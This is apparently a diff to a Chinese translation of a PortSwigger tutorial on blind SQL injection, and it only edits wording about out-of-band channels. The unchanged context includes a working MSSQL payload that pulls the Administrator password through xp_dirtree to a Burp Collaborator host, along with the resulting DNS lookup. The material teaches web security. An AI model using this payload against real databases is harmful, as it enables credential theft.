@@ -151,7 +151,7 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 
 > 实验：[带外交互的 SQL 盲注](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
 
-在确定了触发带外交互的方法后，你就可以使用带外通道从易受攻击的应用程序中窃取数据。例如：
+在确定了触发带外交互的方法后，你就可以使用带外从易受攻击的应用程序中窃取数据。例如：
 
 ```sql
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
@@ -163,7 +163,7 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
 ```
 
-带外（OAST）技术是检测和利用 SQL 盲注的一种非常强大的方法，因为该方法成功的可能性很高，并且能够直接在带外通道中窃取数据。因此，即使在其他盲注利用技术确实起作用的情况下，OAST 技术通常也是首选的。
+带外（OAST）技术是检测和利用 SQL 盲注的一种非常强大的方法，因为该方法成功的可能性很高，并且能够直接在带外中窃取数据。因此，即使在其他盲注利用技术确实起作用的情况下，OAST 技术通常也是首选的。
 
 > 注意
 >
